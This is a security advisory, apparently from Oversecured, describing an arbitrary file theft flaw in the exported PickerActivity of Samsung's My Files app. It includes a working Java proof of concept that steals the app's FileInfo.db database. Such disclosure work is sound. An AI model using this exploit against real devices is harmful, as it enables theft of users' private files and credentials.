# Description

Oversecured report:
![](Oversecured_report.png)

Oversecured found that the My Files app passes data in the exported activity `com.sec.android.app.myfiles.external.ui.PickerActivity` to `Activity.setResult()`. While investigating, it turned out that the app passes files to the attacker, but it also adds the `Intent.FLAG_GRANT_READ_URI_PERMISSION` flag. Moreover, the attacker can control the file path through the `uri` parameter. This leads to the theft of arbitrary files. For example, an attacker could use this vulnerability to steal files containing various credentials of services added to the app.

**Proof of Concept**

Stealing the `/data/user/0/com.sec.android.app.myfiles/databases/FileInfo.db` file. When the user sees a blank screen and clicks Done, the file is leaked to the attacker.

```java
protected void onCreate(Bundle savedInstanceState) {
    super.onCreate(savedInstanceState);

    Intent i = new Intent("com.sec.android.app.myfiles.PICK_SELECT_PATH");
    i.setClassName("com.sec.android.app.myfiles", "com.sec.android.app.myfiles.external.ui.PickerActivity");
    i.putExtra("uri", "/data/user/0/com.sec.android.app.myfiles/databases/FileInfo.db");
    startActivityForResult(i, 0);
}

@Override
protected void onActivityResult(int requestCode, int resultCode, Intent data) {
    super.onActivityResult(requestCode, resultCode, data);

    Log.d("evil", "Result: " + data);
    try (InputStream inputStream = getContentResolver().openInputStream(data.getData())) {
        Log.d("evil", IOUtils.toString(inputStream));
    } catch (Throwable th) {
        throw new RuntimeException(th);
    }
}
```
